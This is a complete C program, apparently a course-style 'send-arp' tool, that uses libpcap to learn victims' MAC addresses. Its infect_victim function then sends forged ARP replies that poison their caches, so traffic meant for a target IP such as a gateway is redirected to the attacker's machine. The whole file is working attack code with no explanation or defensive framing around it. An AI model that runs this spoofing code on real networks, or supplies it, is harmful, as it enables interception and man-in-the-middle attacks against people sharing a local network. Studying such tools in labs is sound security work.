#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>

#define ETHER_ADDR_LEN 6
#define ARPOP_REQUEST 1
#define ARPOP_REPLY 2
#define ETHERTYPE_ARP 0x0806
#define ARPPROTO_IP 0x0800

#pragma pack(push, 1)
struct ethernet_hdr {
    uint8_t  dstmac[ETHER_ADDR_LEN];
    uint8_t  srcmac[ETHER_ADDR_LEN];
    uint16_t type;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct arp_hdr {
    uint16_t hwtype;
    uint16_t proto;
    uint8_t  hwlen;
    uint8_t  protolen;
    uint16_t op;

    uint8_t  smac[ETHER_ADDR_LEN];
    uint32_t sip;
    uint8_t  tmac[ETHER_ADDR_LEN];
    uint32_t tip;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct EthArpPacket {
    struct ethernet_hdr eth;
    struct arp_hdr      arp;
};
#pragma pack(pop)

struct ArpSession {
    uint32_t sender_ip;
    uint32_t target_ip;
    uint8_t  sender_mac[ETHER_ADDR_LEN];
};

void usage(void) {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int get_my_mac(const char* dev, uint8_t* mac) {
    struct ifreq ifr;
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        perror("socket");
        return -1;
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFHWADDR)");
        close(s);
        return -1;
    }

    memcpy(mac, ifr.ifr_addr.sa_data, ETHER_ADDR_LEN);
    close(s);
    return 0;
}

int get_my_ip(const char* dev, uint32_t* ip) {
    struct ifreq ifr;
    int s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        perror("socket");
        return -1;
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFADDR)");
        close(s);
        return -1;
    }

    *ip = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;
    close(s);
    return 0;
}

int send_arp_request(pcap_t* handle, uint8_t* my_mac, uint32_t my_ip, uint32_t target_ip) {
    struct EthArpPacket pkt;

    memset(&pkt, 0, sizeof(pkt));

    memset(pkt.eth.dstmac, 0xFF, ETHER_ADDR_LEN);
    memcpy(pkt.eth.srcmac, my_mac, ETHER_ADDR_LEN);

    pkt.eth.type = htons(ETHERTYPE_ARP);

    pkt.arp.hwtype = htons(1);
    pkt.arp.proto = htons(ARPPROTO_IP);
    pkt.arp.hwlen = 6;
    pkt.arp.protolen = 4;
    pkt.arp.op = htons(ARPOP_REQUEST);

    memcpy(pkt.arp.smac, my_mac, ETHER_ADDR_LEN);
    pkt.arp.sip = my_ip;
    memset(pkt.arp.tmac, 0x00, ETHER_ADDR_LEN);
    pkt.arp.tip = target_ip;

    if (pcap_sendpacket(handle, (const u_char*)&pkt, sizeof(pkt)) != 0) {
        fprintf(stderr, "pcap_sendpacket failed: %s\n", pcap_geterr(handle));
        return -1;
    }

    return 0;
}

int get_sender_mac(pcap_t* handle, uint8_t* sender_mac, uint32_t sender_ip) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res;

    while ((res = pcap_next_ex(handle, &header, &packet)) >= 0) {
        if (res == 0) continue;

        struct EthArpPacket* recv_pkt = (struct EthArpPacket*)packet;

        if (ntohs(recv_pkt->eth.type) == ETHERTYPE_ARP &&
            ntohs(recv_pkt->arp.op) == ARPOP_REPLY &&
            recv_pkt->arp.sip == sender_ip) {

            memcpy(sender_mac, recv_pkt->arp.smac, ETHER_ADDR_LEN);
            return 0;
        }
    }

    return -1;
}

int infect_victim(pcap_t* handle, uint8_t* my_mac, uint8_t* victim_mac,
                  uint32_t victim_ip, uint32_t target_ip) {

    struct EthArpPacket pkt;

    memset(&pkt, 0, sizeof(pkt));

    memcpy(pkt.eth.dstmac, victim_mac, ETHER_ADDR_LEN);
    memcpy(pkt.eth.srcmac, my_mac, ETHER_ADDR_LEN);
    pkt.eth.type = htons(ETHERTYPE_ARP);

    pkt.arp.hwtype = htons(1);
    pkt.arp.proto = htons(ARPPROTO_IP);
    pkt.arp.hwlen = 6;
    pkt.arp.protolen = 4;
    pkt.arp.op = htons(ARPOP_REPLY);

    memcpy(pkt.arp.smac, my_mac, ETHER_ADDR_LEN);
    pkt.arp.sip = target_ip;

    memcpy(pkt.arp.tmac, victim_mac, ETHER_ADDR_LEN);
    pkt.arp.tip = victim_ip;

    if (pcap_sendpacket(handle, (const u_char*)&pkt, sizeof(pkt)) != 0) {
        fprintf(stderr, "pcap_sendpacket failed: %s\n", pcap_geterr(handle));
        return -1;
    }

    return 0;
}

int main(int argc, char* argv[]) {
    if (argc % 2 != 0 || argc < 4) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s (%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    uint8_t my_mac[ETHER_ADDR_LEN];
    uint32_t my_ip;

    if (get_my_mac(dev, my_mac) != 0 ||
        get_my_ip(dev, &my_ip) != 0) {
        pcap_close(handle);
        return EXIT_FAILURE;
    }

    int pairs = (argc - 2) / 2;
    struct ArpSession* sessions = malloc(sizeof(struct ArpSession) * pairs);

    if (sessions == NULL) {
        perror("malloc");
        pcap_close(handle);
        return EXIT_FAILURE;
    }

    for (int i = 0; i < pairs; i++) {
        sessions[i].sender_ip = inet_addr(argv[2 + i * 2]);
        sessions[i].target_ip = inet_addr(argv[3 + i * 2]);

        if (send_arp_request(handle, my_mac, my_ip, sessions[i].sender_ip) != 0 ||
            get_sender_mac(handle, sessions[i].sender_mac, sessions[i].sender_ip) != 0) {
            fprintf(stderr, "Failed to get sender MAC\n");
            free(sessions);
            pcap_close(handle);
            return EXIT_FAILURE;
        }
    }

    for (int i = 0; i < pairs; i++) {
        infect_victim(handle, my_mac,
                      sessions[i].sender_mac,
                      sessions[i].sender_ip,
                      sessions[i].target_ip);
    }

    free(sessions);
    pcap_close(handle);
    return 0;
}

